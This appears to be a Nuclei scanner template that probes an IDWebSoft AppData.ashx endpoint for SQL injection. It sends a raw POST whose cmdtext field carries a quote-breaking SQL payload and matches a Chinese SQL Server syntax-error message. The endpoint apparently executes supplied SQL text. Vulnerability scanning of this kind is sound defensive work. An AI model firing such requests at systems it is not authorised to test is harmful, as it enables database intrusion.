id: IDWebSoft-sql
info:
  name: IDWebSoft-sql
  author: test
  severity: high

http:
  - raw:
      - |
        POST /IDWebSoft/AppData.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 86

        action=GetDataTableByText&cmdtext=SELECT+1'
    matchers:
      - type: dsl
        dsl:
          - contains_all(body_1,"后的引号不完整")